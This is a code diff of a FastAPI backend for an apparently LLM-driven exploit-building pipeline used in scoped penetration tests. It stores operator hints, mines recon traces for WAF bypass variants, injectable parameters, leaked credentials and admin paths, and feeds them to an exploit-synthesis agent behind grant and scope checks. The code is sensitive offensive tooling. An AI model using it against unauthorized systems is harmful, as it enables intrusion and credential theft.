-    _metrics["researched"] = bool(research_out and (research_out.get("analysis") or research_out.get("sources", {}).get("has_public_module")))
-    # A verified PoC is saved verified; an off-target/unverified run is saved too so the
-    # operator can inspect/edit it, but flagged verified=false.
-    store_id = None
+                    auth=None, recon_first=False, recon_source="basic", hint=None,
+                    focused_urls=None):
+    """Dispatch the full build-poc pipeline via the LangGraph in build_poc_graph.
+
+    All ten recon phases (port_sweep -> waf_detect -> waf_characterize -> basic_recon ->
+    response_mine -> auto_login -> framework_deep_enum -> zap_recon -> arjun_recon),
+    plus hint loading, auth establish, research, guidance assembly, strategist, plan
+    verifier, synth, run-refine loop, and store save are nodes in that graph. State
+    flows through a BuildPocState TypedDict so no signal is lost between phases.
+
+    Escape hatch: BUILD_POC_LANGGRAPH=0 raises rather than silently falling back to a
+    monolith that no longer exists. If the graph itself fails, the exception propagates
+    to the caller (endpoint returns 500) rather than pretending success.
+
+    Returns the same dict shape callers expect: {ok, cve, synth_kind, exploit_store_id,
+    authenticated, auth_user, auth_method, success, verified, off_target, drifted,
+    reflection, anchored, canary, iterations, final_command, final_assertion, log_path,
+    llm_model, built_at, security_test_id, metrics}. Caller owns the authorization
+    (grant) check."""
+    import build_poc_graph as _bpg
+    if not _bpg.enabled():
+        raise RuntimeError(
+            "BUILD_POC_LANGGRAPH is disabled. The monolithic _build_poc_core body was "
+            "removed in the LangGraph refactor; set BUILD_POC_LANGGRAPH=1 in the "
+            "rag-api container env and restart to re-enable the pipeline.")
+    _state = _bpg.initial_state(
+        cve, ip, port, product=product, version=version, eid=eid,
+        max_iters=max_iters, research=research, model=model, auth=auth,
+        recon_first=recon_first, recon_source=recon_source, hint=hint,
+        focused_urls=focused_urls or [],
+    )
+    return _bpg.invoke_build_poc(_state)
+
+
+def _ensure_poc_hints_table():
+    with get_db() as conn, conn.cursor() as cur:
+        cur.execute("""CREATE TABLE IF NOT EXISTS public.poc_hints (
+            id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
+            cve text NOT NULL,
+            target_host text,           -- optional: apply to specific host+port
+            target_port integer,
+            hint text NOT NULL,
+            active boolean NOT NULL DEFAULT true,
+            engagement_id uuid,
+            created_by text,
+            created_at timestamptz NOT NULL DEFAULT now(),
+            updated_at timestamptz NOT NULL DEFAULT now())""")
+        cur.execute("""CREATE INDEX IF NOT EXISTS ix_poc_hints_cve
+                       ON public.poc_hints(cve, active)""")
+        conn.commit()
+
+
+def _load_hints_for(cve, ip=None, port=None):
+    """Return the concatenated active hints matching this (cve, ip, port). Most-specific
+    first (exact host+port), then host-only, then cve-only. Empty on any failure."""
+    if not cve:
+        return ""
     try:
-        if result.get("final_command"):
-            store_id = _save_exploit_store(
-                name=f"PoC {cve} on {ip}" + (" (verified)" if result.get("verified") else " (unverified)"),
-                cve=cve, kind="web", target_host=ip, target_port=port,
-                product=product, version=version, command=result.get("final_command"),
-                assertion=result.get("final_assertion"), rationale=built.get("rationale", ""),
-                verified=bool(result.get("verified")), source="cve_poc_builder",
-                security_test_id=result.get("security_test_id"), poc_log_path=result.get("log_path"),
-                llm_model=result.get("llm_model"), built_at=result.get("built_at"), eid=eid,
-                metadata={"off_target": result.get("off_target"), "drifted": result.get("drifted"),
-                          "reflection": result.get("reflection"), "iterations": result.get("iterations"),
-                          "metrics": _metrics,
-                          "research": (research_out or {}).get("analysis"),
-                          "research_sources": (research_out or {}).get("sources")})
+        _ensure_poc_hints_table()
+        parts = []
+        with get_db() as conn, conn.cursor() as cur:
+            # Match: exact host+port -> host only -> cve global
+            cur.execute("""SELECT hint FROM poc_hints
+                           WHERE active AND cve=%s
+                             AND ( (target_host = %s AND target_port = %s)
+                                OR (target_host = %s AND target_port IS NULL)
+                                OR (target_host IS NULL) )
+                           ORDER BY (target_host IS NOT NULL AND target_port IS NOT NULL) DESC,
+                                    (target_host IS NOT NULL) DESC,
+                                    created_at ASC""",
+                        (cve, ip, port, ip))
+            for row in cur.fetchall():
+                if row[0]:
+                    parts.append(str(row[0]).strip())
+        return " ".join(parts)
+    except Exception:  # noqa: BLE001
+        return ""
+
+
+class PocHintBody(BaseModel):
+    cve: str
+    hint: str
+    target_host: Optional[str] = None
+    target_port: Optional[int] = None
+    created_by: Optional[str] = "operator"
+
+
+@app.get("/software/poc-hints", tags=["Assets"])
+def list_poc_hints(cve: Optional[str] = None, target_host: Optional[str] = None,
+                   authorized: bool = Depends(auth)):
+    """List persistent per-CVE operator hints. Filter by cve or target_host."""
+    _ensure_poc_hints_table()
+    where, args = ["active"], []
+    if cve:
+        where.append("cve = %s"); args.append(cve.strip().upper())
+    if target_host:
+        where.append("(target_host = %s OR target_host IS NULL)"); args.append(target_host)
+    sql = "SELECT * FROM poc_hints WHERE " + " AND ".join(where) + " ORDER BY updated_at DESC LIMIT 200"
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute(sql, args)
+        return {"hints": [dict(r) for r in cur.fetchall()]}
+
+
+def _read_trace_entries(exploit_id):
+    """Load the JSONL trace for a build. Returns [] on any error. Centralizes the
+    read so the summary + auto-hint paths share the parser."""
+    import json as _j
+    try:
+        _ensure_exploit_store()
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute("SELECT poc_log_path, metadata FROM exploit_store WHERE id = %s",
+                        (exploit_id,))
+            row = cur.fetchone()
+        if not row:
+            return []
+        md = row.get("metadata") or {}
+        log_path = row.get("poc_log_path") or md.get("log")
+        if not log_path:
+            return []
+        out = []
+        with open(log_path, "r", encoding="utf-8") as fh:
+            for line in fh:
+                line = line.strip()
+                if not line:
+                    continue
+                try:
+                    out.append(_j.loads(line))
+                except Exception:  # noqa: BLE001
+                    continue
+        return out
+    except Exception:  # noqa: BLE001
+        return []
+
+
+def _summarize_build_trace(entries):
+    """Extract structured intel from a build's JSONL trace so the operator gets a
+    one-glance view instead of scrolling through every phase.
+    Returns a dict with:
+      framework, waf_family, waf_proven_variants, open_ports, endpoints_discovered,
+      honored_params (with classification), credentials_found, admin_paths, has_captcha,
+      strategist_primary, plan_verdicts, iterations_summary (each iter -> status/HTTP/
+      last-response-fragment), dead_endpoints (404s), waf_blocks, final_verdict.
+    Used by /exploit-store/{id}/summary and by the auto-hint extractor."""
+    import re as _re
+    s = {
+        "framework": None, "waf_family": None, "waf_proven_variants": {},
+        "open_ports": [], "endpoints_discovered": [], "honored_params": [],
+        "credentials_found": [], "admin_paths": [], "has_captcha": False,
+        "strategist_primary": None, "strategist_alts": [],
+        "plan_verdicts": {}, "iterations_summary": [],
+        "dead_endpoints": [], "waf_blocks": 0,
+    }
+    for e in entries:
+        ph = str(e.get("phase") or "")
+        resp = str(e.get("response") or "")
+        extra = e.get("extra") or {}
+        if ph == "recon:port_sweep":
+            m = _re.search(r"Open ports on [\d.]+\s*\(\d+\):\s*(\[[^\]]+\])", resp)
+            if m:
+                try: s["open_ports"] = eval(m.group(1))  # noqa: S307 - trusted own trace
+                except Exception: pass
+        elif ph == "recon:waf":
+            m = _re.search(r"WAF FAMILY:\s*([a-z_]+)", resp)
+            if m: s["waf_family"] = m.group(1)
+        elif ph == "recon:waf_characterize":
+            if extra.get("proven"):
+                s["waf_proven_variants"] = extra["proven"]
+        elif ph == "recon:zap" or ph == "recon:zap_active":
+            m = _re.search(r"ZAP-spidered paths:\s*([^|]+?)(?:\s*\||$)", resp)
+            if m:
+                for p in m.group(1).split(","):
+                    p = p.strip()
+                    if p and p not in s["endpoints_discovered"]:
+                        s["endpoints_discovered"].append(p)
+        elif ph == "recon:arjun":
+            for m in _re.finditer(r"^\s*(/[^\s:]+):\s*(.+)$", resp, _re.M):
+                path, params_str = m.group(1), m.group(2)
+                for pn in [x.strip() for x in params_str.split(",") if x.strip()]:
+                    s["honored_params"].append({"path": path, "param": pn})
+            # Also grab classified line to enrich with vuln class
+            for m in _re.finditer(r"(/\S+)\s+param\s+`([^`]+)`\s+→\s+likely\s+([^\.]+?)\.\s+(.+?)(?=\n|$)", resp):
+                path, param, cls, hint = m.group(1), m.group(2), m.group(3).strip(), m.group(4).strip()[:180]
+                # If already present without class, upgrade in place
+                found = False
+                for h in s["honored_params"]:
+                    if h["path"] == path and h["param"] == param:
+                        h["class"] = cls; h["payload_hint"] = hint; found = True
+                        break
+                if not found:
+                    s["honored_params"].append({"path": path, "param": param,
+                                                 "class": cls, "payload_hint": hint})
+        elif ph == "recon:response_mine":
+            m = _re.search(r"FRAMEWORK:\s*([^\n]+)", resp)
+            if m: s["framework"] = m.group(1).strip()
+            m = _re.search(r"CREDENTIAL HINTS[^:]*:\s*([^\n]+)", resp)
+            if m:
+                for c in m.group(1).split(","):
+                    c = c.strip().rstrip(".")
+                    if ":" in c: s["credentials_found"].append(c)
+            m = _re.search(r"ADMIN/BACKEND PATHS[^:]*:\s*([^\n]+)", resp)
+            if m:
+                for p in m.group(1).split(","):
+                    p = p.strip().rstrip(".")
+                    if p and p.startswith("/"): s["admin_paths"].append(p)
+        elif ph == "recon:auto_login":
+            if "captcha" in resp.lower(): s["has_captcha"] = True
+        elif ph == "recon:strategist":
+            m = _re.search(r"PRIMARY:\s+class=(\S+)\s+endpoint=(\S+)\s+param=(\S+)\s+method=(\S+)",
+                           resp)
+            if m:
+                s["strategist_primary"] = {"class": m.group(1), "endpoint": m.group(2),
+                                            "param": m.group(3), "method": m.group(4)}
+            for am in _re.finditer(r"(ALT\d):\s+class=(\S+)\s+endpoint=(\S+)\s+param=(\S+)", resp):
+                s["strategist_alts"].append({"label": am.group(1), "class": am.group(2),
+                                              "endpoint": am.group(3), "param": am.group(4)})
+        elif ph == "recon:plan_verified":
+            if extra.get("verdicts"):
+                s["plan_verdicts"] = extra["verdicts"]
+        elif ph == "run":
+            it = int(e.get("iteration") or 0)
+            out = str(e.get("run_output") or "")[:400]
+            passed = bool(e.get("assertion_passed"))
+            status = "PASSED" if passed else "FAILED"
+            if "404 Not Found" in out or "\"404 Not Found\"" in out:
+                status = "404"
+            elif "网站防火墙" in out or "blocked by" in out.lower():
+                status = "WAF-BLOCKED"; s["waf_blocks"] += 1
+            s["iterations_summary"].append({"iter": it, "status": status,
+                                             "output_head": out[:200]})
+        elif ph == "waf_block_detected":
+            s["waf_blocks"] += 1
+        elif ph == "result":
+            s["final_verdict"] = {
+                "verified": bool(e.get("verified")),
+                "reason": e.get("reason") or e.get("response") or ""}
+    # Derived: dead endpoints from 404s across iterations
+    for it_s in s["iterations_summary"]:
+        if it_s["status"] == "404":
+            m = _re.search(r'"([^"]+)"\s+\d+ ', it_s["output_head"])
+            if m and m.group(1) not in s["dead_endpoints"]:
+                s["dead_endpoints"].append(m.group(1))
+    return s
+
+
+def _derive_auto_hint(summary):
+    """Turn a build summary into an operator-hint string. Highest-signal items first
+    so a synth agent reading this immediately sees the strongest attack surface.
+    Returns "" when nothing hint-worthy was collected (empty recon)."""
+    if not summary:
+        return ""
+    lines = []
+    # Framework + WAF context
+    ctx = []
+    if summary.get("framework"): ctx.append(f"framework={summary['framework']}")
+    if summary.get("waf_family"): ctx.append(f"WAF family={summary['waf_family']}")
+    if summary.get("waf_proven_variants"):
+        proven_bits = []
+        for cls, variants in (summary["waf_proven_variants"] or {}).items():
+            if variants:
+                proven_bits.append(f"{cls} passes with [{', '.join(variants[:3])}]")
+        if proven_bits:
+            ctx.append("WAF empirical: " + "; ".join(proven_bits))
+    if ctx:
+        lines.append("CONTEXT: " + " | ".join(ctx))
+    # Confirmed / suspect endpoints from plan verifier — these are gold: proven live
+    if summary.get("plan_verdicts") and summary.get("strategist_primary"):
+        pri = summary["strategist_primary"]
+        v_pri = summary["plan_verdicts"].get("PRIMARY")
+        if v_pri in ("LIVE", "SUSPECT"):
+            lines.append(f"CONFIRMED endpoint (verdict={v_pri}): {pri['method']} "
+                         f"{pri['endpoint']} with param `{pri['param']}` (class {pri['class']}). "
+                         f"This was empirically probed — the endpoint exists and the param is honored. "
+                         f"Use THIS endpoint, not a guessed alternative.")
+        for alt, v_alt in summary["plan_verdicts"].items():
+            if alt == "PRIMARY": continue
+            if v_alt == "LIVE":
+                match = next((a for a in summary.get("strategist_alts", []) if a["label"] == alt), None)
+                if match:
+                    lines.append(f"ALT ({alt}) verified LIVE: {match['endpoint']} param `{match['param']}` "
+                                 f"class {match['class']} — also worth exploiting.")
+    # Classified honored params (Arjun): concrete injection points with payload hints
+    for hp in (summary.get("honored_params") or [])[:6]:
+        if hp.get("class"):
+            lines.append(f"HONORED PARAM: {hp['path']}?{hp['param']}= — likely {hp['class']}. "
+                         f"{hp.get('payload_hint', '')}")
+    # Credentials from mined docs
+    if summary.get("credentials_found"):
+        creds = ", ".join(summary["credentials_found"][:3])
+        line = f"CREDS from leaked docs: {creds}"
+        if summary.get("has_captcha"):
+            line += " (login form has captcha — auto-login skipped; operator must log in manually to get session cookie)"
+        elif summary.get("admin_paths"):
+            line += f" — admin at {', '.join(summary['admin_paths'][:3])}"
+        lines.append(line)
+    # Dead endpoints — tell synth NOT to retry these
+    if summary.get("dead_endpoints"):
+        lines.append(f"DEAD ENDPOINTS (returned 404 on prior attempts, DO NOT retry): "
+                     + ", ".join(summary["dead_endpoints"][:6]))
+    # WAF-blocked earlier
+    if summary.get("waf_blocks", 0) > 0:
+        lines.append(f"WAF blocks previously hit: {summary['waf_blocks']} times. "
+                     "Use only empirical proven-passable variants (see CONTEXT above).")
+    if not lines:
+        return ""
+    return ("AUTO-HINT (derived from prior build's recon — the pipeline already saw "
+            "these signals live on this target): " + " | ".join(lines))
+
+
+def _auto_save_recon_hint(cve, ip, port, hint_text, engagement_id=None):
+    """Persist an auto-derived hint tagged `auto_from_recon` so the next build against
+    the same (cve, host, port) picks it up. Dedupes: replaces any prior auto-hint
+    for the same target rather than accumulating."""
+    if not hint_text:
+        return None
+    _ensure_poc_hints_table()
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            # Deactivate any prior auto-hint for this (cve, host, port)
+            cur.execute("""UPDATE poc_hints SET active=false, updated_at=now()
+                           WHERE cve=%s AND target_host=%s
+                             AND (target_port = %s OR (%s IS NULL AND target_port IS NULL))
+                             AND created_by = 'auto_from_recon' AND active = true""",
+                        (cve, ip, port, port))
+            cur.execute("""INSERT INTO poc_hints
+                           (cve, target_host, target_port, hint, engagement_id, created_by)
+                           VALUES (%s,%s,%s,%s,%s,'auto_from_recon') RETURNING id""",
+                        (cve, ip, port, hint_text, engagement_id))
+            new_id = cur.fetchone()["id"]; conn.commit()
+        return new_id
+    except Exception:  # noqa: BLE001
+        return None
+
+
+@app.get("/exploit-store/{exploit_id}/summary", tags=["Exploit Store"])
+def get_exploit_summary(exploit_id: str, authorized: bool = Depends(auth)):
+    """One-glance overview of a build's recon + plan + iters + verdict.
+    Answers "what did this build see?" without walking the JSONL trace phase-by-phase.
+    Also returns the auto-hint text that would be persisted (whether or not a hint
+    was actually saved) so the operator can decide to keep, edit, or discard it
+    before the next rebuild."""
+    entries = _read_trace_entries(exploit_id)
+    summary = _summarize_build_trace(entries)
+    auto_hint = _derive_auto_hint(summary)
+    return {"ok": True, "exploit_id": exploit_id, "phase_count": len(entries),
+            "summary": summary, "auto_hint": auto_hint}
+
+
+@app.post("/exploit-store/{exploit_id}/derive-hint", tags=["Exploit Store"])
+def derive_and_save_hint(exploit_id: str, authorized: bool = Depends(auth)):
+    """Explicitly extract an auto-hint from this build's trace and persist it as a
+    poc_hint (scoped to the build's CVE + target). The next rebuild automatically
+    uses it. Idempotent: replaces any prior auto-hint for the same target."""
+    _ensure_exploit_store()
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute("SELECT cve, target_host, target_port, engagement_id FROM exploit_store WHERE id = %s",
+                    (exploit_id,))
+        row = cur.fetchone()
+    if not row:
+        raise HTTPException(404, "exploit not found")
+    entries = _read_trace_entries(exploit_id)
+    summary = _summarize_build_trace(entries)
+    hint_text = _derive_auto_hint(summary)
+    if not hint_text:
+        return {"ok": False, "reason": "no hint-worthy signals in this build's trace"}
+    hint_id = _auto_save_recon_hint(row["cve"], row["target_host"], row["target_port"],
+                                      hint_text, row.get("engagement_id"))
+    return {"ok": bool(hint_id), "hint_id": str(hint_id) if hint_id else None,
+            "hint_text": hint_text}
+
+
+@app.post("/software/poc-hints", tags=["Assets"])
+def add_poc_hint(body: PocHintBody, authorized: bool = Depends(auth)):
+    """Persist an operator hint for future builds of this CVE. Prepended to synth guidance
+    ahead of recon/research/auth so it has priority."""
+    _ensure_poc_hints_table()
+    eid = _validate_engagement_uuid(_resolve_engagement_id())
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute("""INSERT INTO poc_hints (cve, target_host, target_port, hint, engagement_id, created_by)
+                       VALUES (%s,%s,%s,%s,%s,%s) RETURNING *""",
+                    (body.cve.strip().upper(), body.target_host, body.target_port,
+                     body.hint, eid, body.created_by or "operator"))
+        row = cur.fetchone(); conn.commit()
+    try:
+        emit_webhook("poc_hint_added", "software",
+                     {"cve": body.cve, "target": body.target_host, "hint_len": len(body.hint)})
     except Exception:  # noqa: BLE001
         pass
-    try:
-        emit_webhook("cve_poc_built", "software",
-                     {"cve": cve, "target": ip, "success": result.get("success"),
-                      "verified": result.get("verified"), "off_target": result.get("off_target"),
-                      "drifted": result.get("drifted"), "llm_model": result.get("llm_model"),
-                      "iterations": result.get("iterations"), "exploit_store_id": store_id,
-                      "security_test_id": result.get("security_test_id")})
-    except Exception:  # noqa: BLE001
-        pass
-    return {"synth_kind": built["synth_kind"], "exploit_store_id": store_id,
-            "authenticated": bool(session_info and session_info.get("ok")),
-            "auth_user": (session_info or {}).get("username"),
-            "auth_method": (session_info or {}).get("method"), **result}
+    return dict(row)
+
+
+@app.delete("/software/poc-hints/{hint_id}", tags=["Assets"])
+def delete_poc_hint(hint_id: str, authorized: bool = Depends(auth)):
+    """Deactivate a hint (soft delete)."""
+    _ensure_poc_hints_table()
+    with get_db() as conn, conn.cursor() as cur:
+        cur.execute("UPDATE poc_hints SET active=false, updated_at=now() WHERE id=%s", (hint_id,))
+        n = cur.rowcount; conn.commit()
+    if not n:
+        raise HTTPException(404, "hint not found")
+    return {"ok": True, "deleted": n}
+
+
+def _resolve_target_url(target_url, ip, port, endpoint_hint, hint):
+    """Resolve a target_url into (ip, port, composed_hint). Explicit ip/port
+    always win; URL fills in the gaps. The parsed path + any endpoint_hint are
+    folded into the operator-hint channel so synth + refine aim there first.
+    Returns (ip, port, hint). Raises HTTPException(400) if URL is unparseable."""
+    from urllib.parse import urlparse
+    url_hint_bits = []
+    if target_url:
+        u = urlparse(target_url.strip())
+        if not u.hostname:
+            raise HTTPException(400, f"target_url is unparseable: {target_url!r}")
+        if not ip:
+            ip = u.hostname
+        if not port:
+            port = u.port or (443 if u.scheme == "https" else 80)
+        path = (u.path or "") + (f"?{u.query}" if u.query else "")
+        if path and path != "/":
+            url_hint_bits.append(
+                f"OPERATOR-SUPPLIED TARGET ENDPOINT: aim the PoC at `{path}` "
+                f"specifically (host {u.hostname}:{port}, scheme {u.scheme}). "
+                f"Do NOT pivot to a different path unless this one is proven dead."
+            )
+    if endpoint_hint:
+        url_hint_bits.append(f"OPERATOR ENDPOINT NOTE: {endpoint_hint.strip()}")
+    composed = hint or ""
+    if url_hint_bits:
+        prefix = " ".join(url_hint_bits)
+        composed = (prefix + ("\n" + composed if composed else "")).strip()
+    return (ip, port, composed or None)
 
 
 @app.post("/software/build-poc", tags=["Assets"])
@@ -14668,25 +18764,44 @@ def build_poc_endpoint(body: BuildPocBody, authorized: bool = Depends(auth)):
     """PoC-builder: research -> synthesize -> run-and-refine. Invoking this authorizes
     the ENTIRE loop (scope-gated traffic every iteration). The verbose prompt/response/
     output trail is written to POC_LOG_DIR/<run_id>.jsonl for review; the DB stores only
-    a small index row, and a security_test ONLY if the PoC converges."""
+    a small index row, and a security_test ONLY if the PoC converges.
+
+    Accepts EITHER explicit ip+port OR a target_url (parsed into both, with
+    the path/query folded into the operator hint)."""
     eid = _validate_engagement_uuid(_resolve_engagement_id())
     cve = (body.cve or "").strip().upper()
-    if not cve.startswith("CVE-"):
-        raise HTTPException(400, "cve must be a CVE id")
+    # cve is optional — synth a NOCVE-<timestamp> token when absent so the
+    # build pipeline (run_id, hints, Store rows) stays unique. Still accepts
+    # a CVE-YYYY-NNNNN id when the operator supplies one.
+    if cve and not cve.startswith("CVE-"):
+        raise HTTPException(400, "cve must be a CVE id (CVE-YYYY-NNNNN) or empty")
+    if not cve:
+        import time as _ttmp
+        cve = f"NOCVE-{int(_ttmp.time())}"
+    ip, port, hint = _resolve_target_url(
+        body.target_url, body.ip, body.port, body.endpoint_hint, body.hint)
+    if not ip:
+        raise HTTPException(400, "either ip or target_url is required")
+    # Without a CVE we need SOMETHING to tell the builder what to look for.
+    # Require either a product name or an endpoint hint so synth has signal.
+    if cve.startswith("NOCVE-") and not (body.product or hint or body.target_url):
+        raise HTTPException(400, "without a CVE, supply at least product, "
+                                 "target_url, or endpoint_hint so synth has signal")
     # Fail-closed authorization: an operator "release" grants this endpoint (standing,
     # revocable); otherwise a grant must already exist. No grant -> refuse.
     if body.release:
-        _grant_poc(body.ip, body.port, eid, granted_by="operator", note=f"released via build-poc for {cve}")
-    elif not _poc_grant_active(body.ip, body.port, eid):
+        _grant_poc(ip, port, eid, granted_by="operator", note=f"released via build-poc for {cve}")
+    elif not _poc_grant_active(ip, port, eid):
         raise HTTPException(403, "PoC building is not released for this endpoint. An operator "
                                  "must release it (grant) first; it stays granted until revoked.")
     auth = None
     if body.username or body.password or body.bruteforce:
         auth = {"username": body.username, "password": body.password,
                 "login_url": body.login_url, "bruteforce": body.bruteforce}
-    core = _build_poc_core(cve, body.ip, body.port, body.product, body.version, eid,
+    core = _build_poc_core(cve, ip, port, body.product, body.version, eid,
                            body.max_iters, model=body.model, auth=auth, recon_first=body.recon_first,
-                           recon_source=body.recon_source or "basic")
+                           recon_source=body.recon_source or "basic", hint=hint,
+                           focused_urls=body.focused_urls or [])
     return {"ok": True, "cve": cve, **core}
 
 
@@ -14694,6 +18809,140 @@ class PocGrantBody(BaseModel):
     ip: str
     port: Optional[int] = None
     note: Optional[str] = ""
+
+
+@app.get("/software/cves-without-poc", tags=["Assets"])
+def software_cves_without_poc(limit: int = 100,
+                              severity: Optional[str] = None,
+                              engagement_id: Optional[str] = None,
+                              all_engagements: bool = False,
+                              scope_only: bool = True,
+                              authorized: bool = Depends(auth)):
+    """Asset-software CVEs with NO stored PoC in exploit_store, so the UI can
+    surface a "Build PoC" action per row — the operator one-clicks and
+    /software/build-poc runs. Pulls from follow_up_items where rule_id =
+    'software_known_cve'; extracts the CVE id from the title/tags; left-joins
+    exploit_store to filter out any CVE that already has a build.
+
+    Returns rows ordered by severity (critical first) + newest first. Each row
+    carries enough to pre-fill a build-poc call: cve, ip, port, product,
+    version, severity, follow_up_id, title snippet.
+
+    Engagement + scope filtering (CLAUDE.md rule — reads must respect both):
+      - engagement_id (or X-Engagement-Id) scopes to that engagement; rows
+        with engagement_id NULL are kept unless all_engagements=true.
+      - scope_only=true (default) further restricts to targets that match
+        scope_targets for the resolved engagement. Set scope_only=false to
+        list every known candidate.
+    """
+    import re as _re
+    from etl.scope_gate import is_in_scope as _is_in_scope, load_engagement_scope as _load_eng_scope
+    eid = engagement_id or _resolve_engagement_id()
+    sev_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
+    sev_filter = (severity or "").strip().lower() or None
+    rows = []
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        # Pull all open software_known_cve follow-ups scoped by engagement
+        args = []
+        where = ["rule_id = 'software_known_cve'", "status != 'dismissed'"]
+        if eid and not all_engagements:
+            where.append("(engagement_id = %s OR engagement_id IS NULL)")
+            args.append(eid)
+        if sev_filter:
+            where.append("severity = %s"); args.append(sev_filter)
+        # Scope filter is applied in Python (not SQL) because the authority is
+        # etl.scope_gate.is_in_scope — same CIDR/domain-wildcard/URL matching
+        # the dispatch gate uses. A `LIKE st.target || '%'` SQL filter would
+        # miss CIDR entries (`192.168.1.0/24` would never LIKE-match
+        # `192.168.1.150`) and would false-match hostname prefixes. Load the
+        # scope rows once; filter rows before enrichment to keep the loop tight.
+        scope_rows = []
+        if scope_only and eid:
+            scope_rows = _load_eng_scope(cur, eid)
+            # Fallback: include global (NULL-engagement) scope rows too so a
+            # mixed engagement/global scope set still gates correctly.
+            try:
+                cur.execute("SELECT target, target_type FROM public.scope_targets "
+                            "WHERE engagement_id IS NULL AND name != 'not_in_scope'")
+                for r in cur.fetchall():
+                    t = r.get("target") if isinstance(r, dict) else r[0]
+                    tt = r.get("target_type") if isinstance(r, dict) else r[1]
+                    if t:
+                        scope_rows.append((t, tt))
+            except Exception:  # noqa: BLE001
+                pass
+        cur.execute(f"""
+            SELECT id, target, title, severity, reason, tags, created_at
+            FROM follow_up_items
+            WHERE {' AND '.join(where)}
+            ORDER BY created_at DESC
+            LIMIT %s
+        """, args + [max(1, min(500, limit * 4))])  # over-fetch; we filter below
+        fu_rows = cur.fetchall()
+        # Build a set of (cve, ip) that already have a PoC
+        cur.execute("""SELECT DISTINCT upper(cve) AS cve, target_host AS ip
+                       FROM exploit_store
+                       WHERE cve IS NOT NULL AND cve ILIKE 'CVE-%'""")
+        has_poc = {(r["cve"], r["ip"]) for r in cur.fetchall()}
+        # Enrich: resolve port+product+version from detected_software
+        for fu in fu_rows:
+            title = fu.get("title") or ""
+            ip = fu.get("target") or ""
+            # Scope filter — use the dispatch gate's own is_in_scope so CIDR
+            # (192.168.1.0/24), domain wildcards and URL rules all behave
+            # identically on read as on dispatch. Skip rows that aren't in
+            # scope for the resolved engagement.
+            if scope_only and eid and scope_rows and not _is_in_scope(ip, scope_rows):
+                continue
+            # Extract CVE ids
+            cves = _re.findall(r"CVE-\d{4}-\d{4,}", title.upper())
+            if not cves:
+                continue
+            # Extract product + version from "Vulnerable: {product} {version} on ..."
+            product, version = None, None
+            m = _re.match(r"Vulnerable:\s+(.+?)\s+(\S+)\s+on\s+", title)
+            if m:
+                product, version = m.group(1), m.group(2)
+            # Resolve port via detected_software (best-effort)
+            port = None
+            try:
+                cur.execute("""SELECT port FROM detected_software
+                               WHERE ip = %s
+                                 AND (%s IS NULL OR lower(product) = lower(%s))
+                                 AND port IS NOT NULL
+                               ORDER BY last_seen DESC LIMIT 1""",
+                            (ip, product, product))
+                r = cur.fetchone()
+                if r:
+                    port = r["port"]
+            except Exception:  # noqa: BLE001
+                pass
+            for cve in cves:
+                if (cve, ip) in has_poc:
+                    continue
+                rows.append({
+                    "cve": cve,
+                    "ip": ip,
+                    "port": port,
+                    "product": product,
+                    "version": version,
+                    "severity": fu.get("severity") or "info",
+                    "follow_up_id": str(fu.get("id")),
+                    "title": title[:200],
+                    "first_seen": (fu.get("created_at").isoformat()
+                                   if fu.get("created_at") else None),
+                    # Operator one-click action: POST this to /software/build-poc
+                    "build_poc_payload": {
+                        "cve": cve, "ip": ip, "port": port,
+                        "product": product, "version": version,
+                        "recon_source": "full", "max_iters": 30,
+                    },
+                })
+    # Sort by severity, then first_seen desc
+    rows.sort(key=lambda r: (sev_order.get(r["severity"], 9),
+                             -(1 if r.get("first_seen") else 0),
+                             r.get("first_seen") or ""), reverse=False)
+    return {"count": len(rows[:limit]), "total_candidates": len(rows), "items": rows[:limit]}
 
 
 @app.get("/software/poc-grants", tags=["Assets"])
@@ -14704,6 +18953,136 @@ def list_poc_grants(authorized: bool = Depends(auth)):
                               granted_at, revoked_at FROM poc_grants
                         WHERE active ORDER BY granted_at DESC""")
         return {"grants": [dict(r) for r in cur.fetchall()]}
+
+
+class RefinePatternApproveBody(BaseModel):
+    guidance: Optional[str] = None  # operator-edited guidance body; falls back to current
+    operator: Optional[str] = None  # for audit trail
+
+
+@app.get("/refine-patterns", tags=["RAG/Knowledge"])
+def list_refine_patterns(include_pending: bool = True,
+                          authorized: bool = Depends(auth)):
+    """List refine-error patterns (both YAML-loaded and operator-approved
+    learned ones). Pending learned patterns (approved_at IS NULL) are
+    included unless include_pending=false."""
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        where = ""
+        if not include_pending:
+            where = "WHERE source = 'yaml' OR approved_at IS NOT NULL"
+        cur.execute(f"""
+            SELECT id, title, guidance, triggers, source,
+                   approved_by, approved_at, created_at, updated_at
+            FROM public.refine_error_patterns
+            {where}
+            ORDER BY source, approved_at IS NULL DESC, id
+        """)
+        return {"patterns": [dict(r) for r in cur.fetchall()]}
+
+
+@app.get("/refine-patterns/pending", tags=["RAG/Knowledge"])
+def list_pending_refine_patterns(authorized: bool = Depends(auth)):
+    """Learned patterns awaiting operator review. Trace-mined from converging
+    builds; shadow-applied in subsequent builds so the operator can see
+    per-pattern trial outcomes BEFORE approving:
+      trial_count    — iterations where the guidance was injected
+      success_count  — iterations the next build iter converged
+      success_rate   — successes / trials
+    Patterns reaching REFINE_AUTO_APPROVE_SUCCESSES (default 2) at rate
+    >= REFINE_AUTO_APPROVE_RATE (default 0.5) get auto-approved on the
+    next mining pass — permanent + visible in the approved list.
+    Approved patterns go live immediately on the next refine iter (cache
+    is 60s TTL)."""
+    with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+        cur.execute("""
+            SELECT id, title, guidance, triggers, created_at,
+                   trial_count, success_count, last_trial_at
+            FROM public.refine_error_patterns
+            WHERE source = 'learned' AND approved_at IS NULL
+            ORDER BY success_count DESC, last_trial_at DESC NULLS LAST
+        """)
+        rows = []
+        for r in cur.fetchall():
+            d = dict(r)
+            t = d.get("trial_count") or 0
+            s = d.get("success_count") or 0
